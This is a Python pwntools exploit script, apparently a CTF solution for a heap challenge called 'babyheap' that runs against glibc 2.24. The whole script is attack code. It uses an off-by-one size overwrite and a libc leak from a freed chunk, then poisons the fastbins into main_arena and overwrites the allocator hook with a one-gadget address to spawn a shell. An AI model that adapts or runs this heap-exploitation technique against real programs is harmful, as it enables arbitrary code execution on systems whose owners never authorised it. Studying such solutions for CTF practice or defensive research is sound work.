from pwn import *

context.binary = "./babyheap"
libc = ELF("./libc-2.24.so")
binary = ELF("./babyheap")
#context.log_level = "debug"
p = process(["./babyheap"])
#pause()

'''
use_bit | size | heapchunk_ptr
'''

def allocate(size):
    p.sendlineafter("Command: ", "1")
    p.sendlineafter("Size: ", str(size))

def update(idx, size, data):
    p.sendlineafter("Command: ", "2")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Content: ", data)

def delete(idx):
    p.sendlineafter("Command: ", "3")
    p.sendlineafter("Index: ", str(idx))

def view(idx):
    p.sendlineafter("Command: ", "4")
    p.sendlineafter("Index: ", str(idx))

allocate(0x48)    # 0
allocate(0x48)    # 1     size overwrite
allocate(0x48)    # 2
allocate(0x48)    # 3
allocate(0x48)    # 4

allocate(0x48)    # 5
allocate(0x48)    # 6
allocate(0x48)    # 7

for i in xrange(8):
    update(i, 0x48, p64(0x51) * 9)

update(0, 0x49, "A" * 0x48 + "\xa1")
delete(1)

allocate(0x48)        # 1
view(2)     # last-remainder / fastbin chunk
p.recvuntil("Chunk[2]: ")
libc_base = u64(p.recv(8)) - 0x3c4b78
arena_t = libc_base + 0x3c4b2d
__malloc_hook = libc_base + 0x3c4b10
main_arena = libc_base + 0x3c4b20
print hex(libc_base)

allocate(0x48)        # 8

delete(8)
delete(5)
delete(2)

allocate(0x48)        # 2
allocate(0x48)        # 5
update(2, 0x8, p64(arena_t))
allocate(0x48)        # 8

allocate(0x28)      # 9
allocate(0x28)      # 10

delete(9)
delete(10)

allocate(0x48)      # 9     -> success
update(9, 0x48, ("\x00" * (0x23 + 8 * 3) + p64(main_arena - 0x28)).ljust(0x48, "\x00"))
allocate(56)        # 10
update(10, 0x10, p64(libc_base + 0x4526a) * 2)
allocate(0x18)

p.interactive()
